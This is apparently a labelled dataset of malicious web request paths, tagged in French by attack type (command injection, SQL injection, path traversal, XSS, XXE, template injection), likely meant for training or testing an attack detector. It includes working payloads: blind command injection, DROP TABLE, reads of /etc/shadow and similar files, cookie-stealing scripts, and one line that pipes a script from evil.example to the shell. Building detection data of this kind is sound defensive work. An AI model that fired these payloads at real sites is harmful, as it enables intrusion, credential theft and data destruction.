+COMMANDE	/actualites?ref=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ITUCTB%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520
+COMMANDE	/intranet/dossier?nom=%2522%250A%2520str%253D%2524%2528echo%2520WXKPIW%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25257C
+SQLI	/produits?annee=1 UNION SELECT table_name FROM information_schema.tables&page=5
+TRAVERSEE	/notes/releve?annee=../../../../../../../../../../../../../../etc/passwd%00
+COMMANDE	/api/v1/equipements?id=%252522%253B%2520str%253D%2524%2528echo%2520PRACFZ%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25206%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252527&page=11
+SQLI	/api/v1/equipements?filtre=admin' or 1=1&page=20
+TRAVERSEE	/inscription/etudiant?annee=%2Fetc%2Flogrotate.d%2Fvsftpd.log&page=10
+SQLI	/article?nom=" or "" "
+COMMANDE	/bibliotheque/ouvrage?ref=%252527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520UFTNKA%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2523
+COMMANDE	/inscription/etudiant?page=%257C%2520%255B%25206%2520-ne%2520%2524%2528echo%2520TNSRYS%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%255C%255C
+TRAVERSEE	//www/logs/proftpd.system.log
+XSS	/api/v1/equipements?page=<script x> alert(1) </script 1=2
+COMMANDE	/notes/releve?id=);}print(`echo%20KXLAQH`.`echo%20$((80%2B88))`.`echo%20KXLAQH`.`echo%20KXLAQH`)%3B.%27KXLAQH
+COMMANDE	/intranet/dossier?annee=%2527%257C%2520%255B%25208%2520-ne%2520%2524%2528echo%2520TYMEOG%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2F%2F
+MODELE	/index.php?ref={{42*42}}
+TRAVERSEE	/article?ref=%2Fusr%2Flocal%2Fetc%2Fapache%2Fconf%2Fhttpd.conf
+XSS	/catalogue?page=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E&page=13
+SQLI	/produits?annee=admin" or 1=1--&page=2
+COMMANDE	/actualites?code=%22%7C%20%5B%205%20-ne%20%24%28echo%20XWWMIW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
+SQLI	/boutique/produit?code=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+TRAVERSEE	/notes/releve?code=/var/log/acct
+COMMANDE	/api/v1/equipements?id=%26echo%2520WTDJVU%24%28%2889%252B9%29%29%24%28echo%2520WTDJVU%29WTDJVU%257C
+SQLI	/login?utilisateur=1%20or%201%3D1&motdepasse=xxxxxxx
+SQLI	/inscription/etudiant?annee=or%201%3D1--
+COMMANDE	/intranet/dossier?recherche=%27%257Cecho%2520LLJKNH%24%28%283%252B88%29%29%24%28echo%2520LLJKNH%29LLJKNH%2F%2F
+XSS	/recherche?id=%3Csvg%3E%3Cscript%20%3F%3Ealert%281%29
+SQLI	/index.php?tri=admin' or 1=1#
+XSS	/produits?annee=x%E2%80%9D%3C%2Ftitle%3E%3Cimg%20src%253dx%20onerror%253dalert%281%29%3E
+SQLI	/index.php?filtre=1%27%7C%7C%27asd%27%7C%7C%27&page=16
+SQLI	/notes/releve?recherche=admin%27%20or%20%271%27%3D%271%27%23
+MODELE	/api/v1/equipements?tri={42*42}
+TRAVERSEE	/api/v1/equipements?q=/usr/spool/mqueue/syslog&page=2
+XSS	/boutique/produit?tri=%3Csvg%2Fonload%3Dconfirm%281%29%3E
+COMMANDE	/intranet/dossier?page=%2522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ZDEMVI%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25204%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2F%2F&page=4
+XSS	/recherche?q=<img src="/" =_=" title="onerror='prompt(1)'">
+XSS	/notes/releve?annee=<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F&page=9
+COMMANDE	/api/v1/equipements?tri=%27%26echo%20PCODKZ$((48%2B2))$(echo%20PCODKZ)PCODKZ\&page=8
+XXE	/article?nom=%3C%21DOCTYPE%20xxe%20%5B%3C%21ENTITY%20foo%20%22aaaaaa%22%3E%5D%3E%3Croot%3E%26foo%3B%3C%2Froot%3E
+COMMANDE	/catalogue?tri=%252522%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ZTQVNM%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25202%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2527
+XSS	/actualites?tri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+COMMANDE	/boutique/produit?recherche=%26%26echo$IFSONQKZZ$((73%2B7))$(echo$IFSONQKZZ)ONQKZZ"&page=10
+SQLI	/produits?recherche=admin" or "1"="1"/*&page=9
+TRAVERSEE	/index.php?q=/var/log/auth&page=20
+SQLI	/login?utilisateur=admin%22%29%20or%20%28%221%22%3D%221&motdepasse=xxxxx
+XSS	/produits?ref=%3C%3Cscr%5C0ipt%2Fsrc%3Dhttp%3A%2F%2Fxss.com%2Fxss.js%3E%3C%2Fscript
+XSS	/api/v1/equipements?filtre=%3Cimg%20src%3D%60xx%3Axx%60onerror%3Dalert%281%29%3E&page=13
+SQLI	/connexion?utilisateur=1%3B%20DROP%20TABLE%20etudiants--&motdepasse=xxxx
+SQLI	/catalogue?filtre=admin%22%20or%201%3D1
+COMMANDE	/intranet/dossier?annee=%2522%253B%2520str%253D%2524%2528echo%2520VQEAPQ%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2527
+COMMANDE	/intranet/dossier?ref=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520MISRQQ%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25205%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%25257C
+SQLI	/notes/releve?page=admin' or '1'='1&page=7
+TRAVERSEE	/inscription/etudiant?recherche=%2Fusr%2Flocal%2Fapache2%2Flogs%2Ferror.log
+COMMANDE	/actualites?page=%26%26curl%20http%3A%2F%2Fevil.example%2Fs.sh%7Csh&page=17
+COMMANDE	/index.php?code=%22%2526%2526echo%2520WSLHMV%24%28%2815%252B92%29%29%24%28echo%2520WSLHMV%29WSLHMV%257C
+COMMANDE	/api/v1/equipements?filtre=%250A%2520str%253D%2524%2528echo%2520UVFUKR%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25208%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520
+MODELE	/index.php?filtre=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D&page=13
+TRAVERSEE	/telechargement/..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+TRAVERSEE	/static//etc/hostname.ce0
+TRAVERSEE	/produits?tri=..%2F..%2F..%2F..%2Fapache%2Flogs%2Ferror.log
+SQLI	/notes/releve?ref=admin%22%2F%2A
+COMMANDE	/api/v1/equipements?id=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520GIKITN%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25201%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2F%2F&page=9
+SQLI	/produits?page=admin") or ("1"="1"--&page=12
+TRAVERSEE	/fichiers//root/.bash_history
+MODELE	/inscription/etudiant?annee=%24%7Bdonotexists%7C42%2A42%7D
+COMMANDE	/intranet/dossier?filtre=%7Cecho%2520VEMEGX%24%28%2863%252B29%29%29%24%28echo%2520VEMEGX%29VEMEGX%26
+XXE	/actualites?nom=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20xxe%20%5B%3C%21ENTITY%20foo%20%22aaaaaa%22%3E%5D%3E
+TRAVERSEE	/bibliotheque/ouvrage?q=%2FVolumes%2FwebBackup%2Fopt%2Fapache2%2Fconf%2Fhttpd.conf
+TRAVERSEE	//etc/hostname.hme2
+SQLI	/catalogue?tri=%27%29%20or%20%28%27x%27%29%3D%28%27x
+TRAVERSEE	/static//etc/ssh/sshd_config
+COMMANDE	/notes/releve?ref=%22%3B%20str%3D%24%28echo%20VQEAPQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27&page=1
+SQLI	/notes/releve?filtre=admin%22%29%20or%20%221%22%3D%221%22%2F%2A
+XSS	/recherche?code=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript%20.com
+MODELE	/actualites?page=%7B%7B7%2A7%7D%7D
+SQLI	/recherche?code=admin") or "1"="1"#
+COMMANDE	/inscription/etudiant?tri=%252522%253B%2520str%253D%2524%2528echo%2520LMZYDH%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%25255C%25255C
+COMMANDE	/bibliotheque/ouvrage?code=%7C%7Cecho%2520ZLPJPQ%24%28%2881%252B32%29%29%24%28echo%2520ZLPJPQ%29ZLPJPQ%257C
+COMMANDE	/produits?code=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CQWURN%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23&page=14
+COMMANDE	/catalogue?page=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520FWEHDM%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2527
+TRAVERSEE	/telechargement//etc/nsswitch.conf
+TRAVERSEE	/documents/../../../../../etc/passwd
+COMMANDE	/index.php?ref=echo%24IFSDYARGF%24%28%2839%252B79%29%29%24%28echo%24IFSDYARGF%29DYARGF%22
+COMMANDE	/boutique/produit?code=&&echo%20FOJNEL$((64%2B8))$(echo%20FOJNEL)FOJNEL
+TRAVERSEE	/fichiers/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+TRAVERSEE	/documents//etc/hostname.elxl2
+SQLI	/notes/releve?q=1' or 1.e(1) or '1'='1
+COMMANDE	/article?code=%253B%2520str%253D%2524%2528echo%2520OJGBKF%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2526
+TRAVERSEE	/telechargement/..\../..\../boot.ini
+XSS	/produits?code=%3Ciframe%20src%3D%2522404%2522%20onload%3D%2522content.frames%5B0%5D.document.write%28%2526quot%3B%3Cscript%3Er%3Dnew%20XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28150%2C41%29%29%3B%7D%3C%5C%2Fscript%3E%2526quot%3B%29%2522%3E%3C%2Fiframe%3E&page=20
+COMMANDE	/catalogue?filtre=%250A%2520str%253D%2524%2528echo%2520BPTQEJ%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25207%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520
+XSS	/notes/releve?nom=%3Cscript%3E%20var%20xdr%20%3D%20new%20ActiveXObject%28%2522Microsoft.XMLHTTP%2522%29%3B%20%20xdr.open%28%2522get%2522%2C%20%2522%2Fxssme2%253Fa%3D1%2522%2C%20true%29%3B%20xdr.onreadystatechange%20%3D%20function%28%29%20%7B%20try%7B%20%20%20var%20c%3B%20%20%20if%20%28c%3Dxdr.responseText.match%28%2Fdocument.cookie%20%3D%20%27%28.%2A%253F%29%27%2F%29%20%29%20%20%20%20alert%28c%5B1%5D%29%3B%20%7Dcatch%28e%29%7B%7D%20%7D%3B%20%20xdr.send%28%29%3B%20%3C%2Fscript%3E
+XXE	/notes/releve?filtre=%3Cfoo%3E%3C%21%5BCDATA%5B%27%20or%201%3D1%20or%20%27%27%3D%27%5D%5D%3E%3C%2Ffoo%3E&page=10
+SQLI	/index.php?ref=admin") or "1"="1"--&page=14
+SQLI	/actualites?page=" "&page=13
+TRAVERSEE	/catalogue?tri=/var/log/messages&page=5
+XSS	/produits?tri=<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>&page=8
+XXE	/bibliotheque/ouvrage?recherche=%26foo%3B
+XSS	/inscription/etudiant?tri=%3Cscript%3E%20%20function%20foo%28elem%2C%20doc%2C%20text%29%20%7B%20%20%20elem.onclick%20%3D%20function%20%28e%29%20%7B%20%20%20%20e.__defineGetter__%28text%5B0%5D%2C%20function%20%28%29%20%7B%20return%20true%20%7D%29%20%20%20%20alert%28Safe.get%28%29%29%3B%20%20%20%7D%3B%20%20%20%20%20%20var%20event%20%3D%20doc.createEvent%28text%5B1%5D%29%3B%20%20%20event.initEvent%28text%5B2%5D%2C%20true%2C%20true%29%3B%20%20%20elem.dispatchEvent%28event%29%3B%20%20%7D%20%3C%2Fscript%3E%20%3Cimg%20src%3Dhttp%3A%2F%2Fwww.google.fr%2Fimages%2Fsrpr%2Flogo3w.png%20onload%3Dfoo%28this%2Cthis.ownerDocument%2Cthis.name.split%28%2F%2C%2F%29%29%20name&page=2
+SQLI	/connexion?utilisateur=%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29--&motdepasse=xxxxx
+XSS	/produits?ref=<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
+XSS	/produits?ref=%27%3Cscript%3Ewindow.onload%3Dfunction%28%29%7Bdocument.forms%5B0%5D.message.value%3D%271%27%3B%7D%3C%2Fscript%3E
+SQLI	/inscription/etudiant?code=' AND SLEEP(5)--&page=19
+SQLI	/produits?ref=admin%27%20or%20%271%27%3D%271%27--
+XXE	/boutique/produit?ref=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E
+COMMANDE	/catalogue?filtre=%27%7Cecho%24IFSLBYJEO%24%28%2876%252B85%29%29%24%28echo%24IFSLBYJEO%29LBYJEO%252F%252F
+XSS	/inscription/etudiant?filtre=%3Cobject%20type%3D%22text%2Fx-scriptlet%22%20data%3D%22http%3A%2F%2Fjsfiddle.net%2FXLE63%2F%20%22%3E%3C%2Fobject%3E
+TRAVERSEE	/fichiers/../../../../../../../../../../../../localstart.asp%00
+COMMANDE	/article?id=%250A%2520str%253D%2524%2528echo%2520GOUIRV%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520&page=18
+COMMANDE	/intranet/dossier?ref=%250A%2520str%253D%2524%2528echo%2520JLLXMB%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25204%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%252527
+COMMANDE	/bibliotheque/ouvrage?tri=%26echo$IFSJREIYL$((10%2B95))$(echo$IFSJREIYL)JREIYL\&page=8
+TRAVERSEE	/api/v1/equipements?page=/C:/inetpub/ftproot/
+SQLI	/bibliotheque/ouvrage?code=' or true--
+TRAVERSEE	/static//core/config.php
+SQLI	/notes/releve?q=admin'--&page=13
+XXE	/boutique/produit?nom=%3C%21%5BCDATA%5B%3Cscript%3Evar%20n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E&page=19
+XXE	/notes/releve?annee=<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+SQLI	/actualites?id=admin%22%29%20or%20%28%221%22%3D%221
+COMMANDE	/index.php?code=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520TABXYH%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25205%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520
+TRAVERSEE	/recherche?recherche=/.htpasswd&page=11
+TRAVERSEE	/catalogue?ref=%2Fetc%2Fpasswd%2500
+SQLI	/index.php?annee=admin%22%20or%201%3D1%2F%2A&page=19
+XSS	/api/v1/equipements?annee=<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+SQLI	/index.php?ref=%22%20or%20%22x%22%3D%22x&page=20
+COMMANDE	/recherche?page=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520TMPVMS%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25208%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252522&page=20
+TRAVERSEE	/api/v1/equipements?page=%2Fvar%2Frun%2Fhttpd.pid
+COMMANDE	/article?id=%257C%257Cecho%24IFSWFBDXM%24%28%288%252B58%29%29%24%28echo%24IFSWFBDXM%29WFBDXM%257C
+TRAVERSEE	/fichiers/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+COMMANDE	/catalogue?code=%252527%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520FKFULK%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2522
+MODELE	/index.php?code=%7B%7B7%2A7%7D%7D
+SQLI	/actualites?recherche=[1]
+SQLI	/index.php?annee=or true--&page=8
+SQLI	/login?utilisateur=%22%29%20or%20true--&motdepasse=xxxxxxxx
+TRAVERSEE	/documents//var/log/apache2/access.log
+SQLI	/espace/connexion?utilisateur=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%29%3E0--&motdepasse=xxxxx
+TRAVERSEE	/notes/releve?filtre=%2Fvar%2Flog%2Fapache%2Ferror.log
+SQLI	/connexion?utilisateur=%27%29%20or%20true--&motdepasse=xxxxxx
+SQLI	/login?utilisateur=admin%27%20or%201%3D1--&motdepasse=xxxxxxxxx
+SQLI	/bibliotheque/ouvrage?ref=%22-%22
+TRAVERSEE	/bibliotheque/ouvrage?id=.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+TRAVERSEE	/notes/releve?code=/var/local/www/conf/php.ini&page=15
+SQLI	/intranet/dossier?nom=1%2F%2A%27%2A%2F
+SQLI	/boutique/produit?code=%27%20%27
+SQLI	/intranet/dossier?code=admin%22%20or%201%3D1--&page=15
+SQLI	/article?filtre=' or ''&'&page=18
+SQLI	/article?q=1' or '1'='1&page=3
+COMMANDE	/inscription/etudiant?tri=%2527%7Cecho%2520GXDPVN%24%28%2869%252B6%29%29%24%28echo%2520GXDPVN%29GXDPVN
+SQLI	/catalogue?tri=' or ''&'
+SQLI	/bibliotheque/ouvrage?page=1%27%20or%20%271%27%3D%271
+COMMANDE	/intranet/dossier?ref=%3Becho%24IFSXAJUQV%24%28%2880%252B48%29%29%24%28echo%24IFSXAJUQV%29XAJUQV
+TRAVERSEE	/documents//etc/security/environ
+TRAVERSEE	/fichiers/members/.htpasswd
+COMMANDE	/index.php?q=%2527%26%26echo%2520ICNFZX%24%28%2885%252B34%29%29%24%28echo%2520ICNFZX%29ICNFZX%2522&page=8
+SQLI	/api/v1/equipements?tri=%22%20or%20%22%22%5E%22&page=11
+SQLI	/inscription/etudiant?recherche=1 OR '1'='1
+XXE	/actualites?id=%3CHTML%20xmlns%3Axss%3E%3C%3Fimport%20namespace%3D%22xss%22%20implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E&page=20
+TRAVERSEE	/intranet/dossier?page=/var/log/httpd/
+XSS	/catalogue?nom=%27%2522--%253E%253C%2Fstyle%253E%253C%2Fscript%253E%253Cscript%253Eshadowlabs%280x000045%29%253C%2Fscript%253E&page=3
+COMMANDE	/produits?q=%2526%2526echo%24IFSLJOFVO%24%28%2824%252B48%29%29%24%28echo%24IFSLJOFVO%29LJOFVO%7C
+SQLI	/boutique/produit?code=1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)&page=12
+XSS	/notes/releve?recherche=<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
+SQLI	/recherche?nom=1%2F%2A%27%2A%2F
+TRAVERSEE	//etc/opt/ipf/ipnat.conf
+SQLI	/bibliotheque/ouvrage?page=admin%27%29%20or%20%28%271%27%3D%271
+XXE	/catalogue?tri=%3Csoap%3ABody%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%21DOCTYPE%20doc%20%5B%3C%21ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fx.x.x.x%3A22%2F%22%3E%20%25dtd%3B%5D%3E%3Cxxx%2F%3E%5D%5D%3E%3C%2Ffoo%3E%3C%2Fsoap%3ABody%3E
+COMMANDE	/api/v1/equipements?code=%2522%3B%20str%3D%24%28echo%20AVKIFD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
+TRAVERSEE	/notes/releve?page=..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+COMMANDE	/notes/releve?q=")print(`echo%20PHKGWS\necho%20$((9%2B71))\necho%20PHKGWS\necho%20PHKGWS`)%3BPHKGWS
+TRAVERSEE	/boutique/produit?id=/usr/etc/pure-ftpd.conf&page=12
+XSS	/inscription/etudiant?q=<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+XSS	/intranet/dossier?page=<script src="data:text/javascript,alert(1)"></script>
+SQLI	/login?utilisateur=%27%20or%20%27%27%3D%27&motdepasse=xxxxx
+SQLI	/recherche?recherche=1%27&page=19
+MODELE	/boutique/produit?code=%24%7B7%2A7%7D
+XSS	/recherche?filtre=<div/onmouseover='alert(1)'> style="x:">
+TRAVERSEE	/documents/..%25c0%25af../..%25c0%25af../..%25c0%25af../..%25c0%25af../..%25c0%25af../..%25c0%25af../boot.ini
+XXE	/boutique/produit?recherche=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27XSS%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E%2FSCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C%2Ffoo%3E&page=11
+XXE	/catalogue?filtre=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y
+MODELE	/inscription/etudiant?filtre={{{42*42}}}
+COMMANDE	/inscription/etudiant?nom=%2527%253B%2520str%253D%2524%2528echo%2520PSUJGU%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2F%2F
+XSS	/produits?nom=<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
+SQLI	/index.php?filtre=1' ORDER BY 10--
+XXE	/catalogue?annee=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fexample%3A443%22%20%3E%5D%3E
+TRAVERSEE	/actualites?ref=..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache%2Ferror_log
+COMMANDE	/produits?code="%26echo$IFSTQUHGT$((51%2B9))$(echo$IFSTQUHGT)TQUHGT|
+XSS	/boutique/produit?tri=%3Ciframe%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%3E
+TRAVERSEE	/static/C:/inetpub/wwwroot/global.asa
+TRAVERSEE	/boutique/produit?q=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess_log&page=9
